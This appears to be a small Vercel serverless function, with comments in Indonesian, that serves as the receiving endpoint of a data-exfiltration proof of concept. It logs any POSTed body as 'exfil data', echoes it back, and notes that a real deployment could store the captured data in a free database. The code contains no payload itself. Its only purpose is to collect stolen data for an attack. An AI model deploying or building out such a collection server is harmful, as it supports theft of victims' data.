// api/log.js - Vercel Serverless Function
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    console.log('Received exfil data:', JSON.stringify(data, null, 2));
    
    // Untuk PoC sederhana: return data agar bisa dilihat di network tab
    // Di real, bisa simpan ke database gratis seperti Upstash Redis atau KV Vercel
    res.status(200).json({ success: true, received: data });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
